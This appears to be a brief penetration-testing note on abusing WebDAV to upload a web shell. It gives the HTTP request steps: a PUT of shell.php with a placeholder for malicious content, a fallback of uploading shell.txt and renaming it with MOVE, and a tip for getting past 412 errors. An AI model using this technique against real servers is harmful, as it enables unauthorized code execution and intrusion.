WebDav is an http extension that allows to upload files

PUT /shell.php 

<malicious_content_in_the_request_body>


If you cannot PUT shell.php then try:

PUT /shell.txt

If successful then

MOVE shell.txt
Destination: shell.php

If during the process you keep getting error code 412 - Precondition Failed - just remove a few request headers
